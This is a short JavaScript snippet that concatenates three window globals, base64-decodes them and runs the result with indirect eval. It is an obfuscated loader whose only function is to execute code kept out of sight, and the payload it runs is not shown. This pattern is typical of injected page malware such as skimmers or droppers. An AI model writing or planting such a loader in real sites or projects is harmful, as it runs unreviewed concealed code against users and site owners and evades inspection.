(function(){
  var s = window.__B0 + window.__B1 + window.__B2;
  var b = atob(s);
  var u = new Uint8Array(b.length);
  for (var i = 0; i < b.length; i++) u[i] = b.charCodeAt(i);
  (0, eval)(new TextDecoder("utf-8").decode(u));
})();
